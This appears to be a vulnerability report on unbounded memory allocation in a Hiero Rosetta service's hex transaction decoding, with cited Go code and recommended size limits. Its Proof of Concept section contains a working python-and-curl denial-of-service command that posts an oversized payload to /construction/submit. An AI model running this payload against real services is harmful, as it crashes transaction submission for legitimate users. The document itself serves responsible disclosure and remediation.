### Title
Unbounded Memory Allocation via Oversized Hex-Encoded Transaction in `unmarshallTransactionFromHexString()`

### Summary
The `unmarshallTransactionFromHexString()` function in `rosetta/app/services/construction_service.go` performs no length check on the input string before calling `hex.DecodeString()` and `hiero.TransactionFromBytes()`. Any unauthenticated caller can POST an arbitrarily large hex string to `/construction/submit`, `/construction/combine`, `/construction/hash`, or `/construction/parse`, causing the server to allocate proportionally large memory buffers and potentially exhaust available heap memory, crashing the Rosetta service and blocking all subsequent transaction submissions.

### Finding Description
**Exact code path:**

`unmarshallTransactionFromHexString()` at [1](#0-0)  is called unconditionally from:
- `ConstructionSubmit()` at [2](#0-1) 
- `ConstructionCombine()` at [3](#0-2) 
- `ConstructionHash()` at [4](#0-3) 
- `ConstructionParse()` at [5](#0-4) 

**Root cause:** The function immediately calls `hex.DecodeString()` on the raw input string with no prior length validation. `hex.DecodeString` allocates a `[]byte` of `len(input)/2`. That buffer is then passed to `hiero.TransactionFromBytes()`, which performs protobuf deserialization and may allocate additional internal structures. There is no upper bound on any of these allocations.

**Why existing checks fail:**

The `Http` config struct only configures timeouts — `IdleTimeout`, `ReadTimeout`, `ReadHeaderTimeout`, `WriteTimeout` — with no body size field: [6](#0-5) 

The HTTP server in `main.go` applies only those timeouts and sets no `MaxHeaderBytes` or body size limit: [7](#0-6) 

The middleware chain (`TracingMiddleware`, `MetricsMiddleware`) performs no body size enforcement: [8](#0-7) [9](#0-8) 

No `http.MaxBytesReader`, `io.LimitReader`, or string-length guard exists anywhere in the rosetta application code. A `ReadTimeout` only limits the wall-clock time to read the body; on a fast or local network connection a multi-gigabyte body can be fully received well within any reasonable timeout, after which the allocation happens synchronously in the handler goroutine.

### Impact Explanation
An attacker who exhausts the process heap causes an OOM kill of the Rosetta service. All in-flight and subsequent calls to `/construction/submit` fail, meaning no transactions can be forwarded to Hiero network nodes through this interface until the service is restarted. Because the four affected endpoints are all unauthenticated and the allocation is proportional to input size, a single request carrying a ~1 GB hex string (2 GB JSON body) is sufficient to trigger the condition. Repeated requests prevent recovery. This constitutes a complete denial-of-service of the transaction-submission path exposed by the mirror node's Rosetta API.

### Likelihood Explanation
The Rosetta API is designed to be publicly reachable (it is the external interface for transaction construction and submission). No credentials, API keys, or prior state are required to call `/construction/submit` or `/construction/combine`. The exploit requires only a single HTTP POST with a crafted oversized string field — trivially scriptable with `curl` or any HTTP client. It is repeatable at will and requires no special knowledge of the network or cryptographic material.

### Recommendation
1. **Enforce a maximum request body size** at the HTTP layer using `http.MaxBytesReader` in a middleware wrapper applied before any handler reads the body. A limit of 1–2 MB is more than sufficient for any valid Hiero transaction.
2. **Add an explicit string-length guard** inside `unmarshallTransactionFromHexString()` before calling `hex.DecodeString()`:
   ```go
   const maxTransactionHexLen = 2 * 1024 * 1024 // 1 MB decoded
   if len(tools.SafeRemoveHexPrefix(transactionString)) > maxTransactionHexLen {
       return nil, errors.ErrTransactionDecodeFailed
   }
   ```
3. Add the `MaxBytesReader` middleware to the server router setup in `main.go` so all endpoints benefit from the limit regardless of future code changes.

### Proof of Concept
```bash
# Generate a 500 MB hex string (250 MB of decoded bytes) and POST to /construction/submit
python3 -c "
import json, sys
payload = {
  'network_identifier': {'blockchain': 'Hiero', 'network': 'testnet'},
  'signed_transaction': '0x' + 'ab' * (250 * 1024 * 1024)
}
sys.stdout.write(json.dumps(payload))
" | curl -s -X POST http://<rosetta-host>:5700/construction/submit \
     -H 'Content-Type: application/json' \
     --data-binary @-
```
Sending several such concurrent requests will exhaust the Go process heap, causing an OOM termination. After the process dies, all legitimate `/construction/submit` calls fail until the service is manually restarted.

### Citations

**File:** rosetta/app/services/construction_service.go (L62-65)
```go
	transaction, rErr := unmarshallTransactionFromHexString(request.UnsignedTransaction)
	if rErr != nil {
		return nil, rErr
	}
```

**File:** rosetta/app/services/construction_service.go (L121-124)
```go
	signedTransaction, rErr := unmarshallTransactionFromHexString(request.SignedTransaction)
	if rErr != nil {
		return nil, rErr
	}
```

**File:** rosetta/app/services/construction_service.go (L187-190)
```go
	transaction, err := unmarshallTransactionFromHexString(request.Transaction)
	if err != nil {
		return nil, err
	}
```

**File:** rosetta/app/services/construction_service.go (L340-343)
```go
	transaction, rErr := unmarshallTransactionFromHexString(request.SignedTransaction)
	if rErr != nil {
		return nil, rErr
	}
```

**File:** rosetta/app/services/construction_service.go (L658-674)
```go
func unmarshallTransactionFromHexString(transactionString string) (hiero.TransactionInterface, *rTypes.Error) {
	transactionBytes, err := hex.DecodeString(tools.SafeRemoveHexPrefix(transactionString))
	if err != nil {
		return nil, errors.ErrTransactionDecodeFailed
	}

	transaction, err := hiero.TransactionFromBytes(transactionBytes)
	if err != nil {
		return nil, errors.ErrTransactionUnmarshallingFailed
	}

	if rErr := isSupportedTransactionType(transaction); rErr != nil {
		return nil, rErr
	}

	return transaction, nil
}
```

**File:** rosetta/app/config/types.go (L64-69)
```go
type Http struct {
	IdleTimeout       time.Duration `yaml:"idleTimeout"`
	ReadTimeout       time.Duration `yaml:"readTimeout"`
	ReadHeaderTimeout time.Duration `yaml:"readHeaderTimeout"`
	WriteTimeout      time.Duration `yaml:"writeTimeout"`
}
```

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** rosetta/app/middleware/trace.go (L43-61)
```go
func TracingMiddleware(inner http.Handler) http.Handler {
	return http.HandlerFunc(func(responseWriter http.ResponseWriter, request *http.Request) {
		start := time.Now()
		clientIpAddress := getClientIpAddress(request)
		path := request.URL.RequestURI()
		tracingResponseWriter := newTracingResponseWriter(responseWriter)

		inner.ServeHTTP(tracingResponseWriter, request)

		message := fmt.Sprintf("%s %s %s (%d) in %s",
			clientIpAddress, request.Method, path, tracingResponseWriter.statusCode, time.Since(start))

		if internalPaths[path] {
			log.Debug(message)
		} else {
			log.Info(message)
		}
	})
}
```

**File:** rosetta/app/middleware/metrics.go (L76-83)
```go
func MetricsMiddleware(next http.Handler) http.Handler {
	return middleware.Instrument{
		Duration:         requestDurationHistogram,
		InflightRequests: requestInflightGauge,
		RequestBodySize:  requestBytesHistogram,
		ResponseBodySize: responseBytesHistogram,
		RouteMatcher:     next.(middleware.RouteMatcher),
	}.Wrap(next)
```
